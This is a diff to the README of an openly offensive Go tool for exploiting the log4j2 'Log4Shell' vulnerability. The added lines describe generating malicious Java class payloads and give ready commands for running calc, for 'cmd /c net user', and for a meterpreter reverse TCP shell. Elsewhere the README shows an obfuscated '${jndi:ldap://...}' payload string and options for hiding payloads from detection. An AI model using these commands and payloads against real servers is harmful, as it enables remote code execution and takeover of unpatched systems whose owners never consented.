@@ -3,7 +3,7 @@
  [![Go Report Card](https://goreportcard.com/badge/github.com/For-ACGN/Log4Shell)](https://goreportcard.com/report/github.com/For-ACGN/Log4Shell)
  [![GoDoc](https://godoc.org/github.com/For-ACGN/Log4Shell?status.svg)](http://godoc.org/github.com/For-ACGN/Log4Shell)
  [![License](https://img.shields.io/github/license/For-ACGN/Log4Shell.svg)](https://github.com/For-ACGN/Log4Shell/blob/master/LICENSE)\
- Check, exploit, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
+ Check, exploit, generate class, obfuscate, TLS, ACME about log4j2 vulnerability in one Go program. 
 
 ## Feature
  * Only one program and easy deployment
@@ -11,6 +11,7 @@
  * Support multi Java class files
  * Support LDAPS and HTTPS server
  * Support ACME to sign certificate
+ * Generate class without java compiler
  * Support obfuscate malicious(payload)
  * Hide malicious(payload) string
  * Add secret to protect HTTP server
@@ -28,6 +29,20 @@
  ### Start Log4Shell server with ACME
    * ```Log4Shell.exe -host "example.com" -auto-cert``` (must use domain name)
 
+ ### Generate Java class file
+   ```
+   Execute(no output):
+     Log4Shell.exe -gen "execute" -args "-cmd calc" -class "Test"
+     
+   System(with output):
+     Log4Shell.exe -gen "system" -args "-bin cmd -args \"/c net user\"" -class "Test"
+     
+   ReverseTCP(java/meterpreter/reverse_tcp):  // template will be open source after some time
+     Log4Shell.exe -gen "reverse_tcp" -args "-host 127.0.0.1 -port 9979" -class "Test"
+   
+   The generated class file will be saved to the payload directory(can set output flag)
+   ```
+
  ### Obfuscate malicious(payload) string
    ```
    Log4Shell.exe -obf "${jndi:ldap://1.1.1.1:3890/Calc}"
@@ -44,9 +59,9 @@
    Each string can only be used once, or wait 20 seconds.
    ```
    ```
-   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the number
-   of repetitions is equal the number of occurrences about string "${". The LDAP server add a
-   simple token mechanism for prevent it. 
+   When obfuscate malicious(payload) string, log4j2 package will repeat execute it, the number of
+   repetitions is equal the number of occurrences about string "${". The LDAP server add a simple
+   token mechanism for prevent it. 
    ```
    
   ### Hide malicious(payload) string
@@ -111,8 +126,14 @@
                                                         https://github.com/For-ACGN/Log4Shell
 
 Usage of Log4Shell.exe:
+  -args string
+        arguments about generate Java class file
   -auto-cert
         use ACME client to sign certificate automatically
+  -class string
+        specify the new class name
+  -gen string
+        generate Java class file with template name
   -hide
         hide obfuscated malicious(payload) string in log4j2
   -host string
@@ -129,6 +150,8 @@ Usage of Log4Shell.exe:
         not add random token when use obfuscate
   -obf string
         obfuscate malicious(payload) string
+  -output string
+        generated Java class file output path
   -payload string
         payload(java class) directory (default "payload")
   -tls-cert string
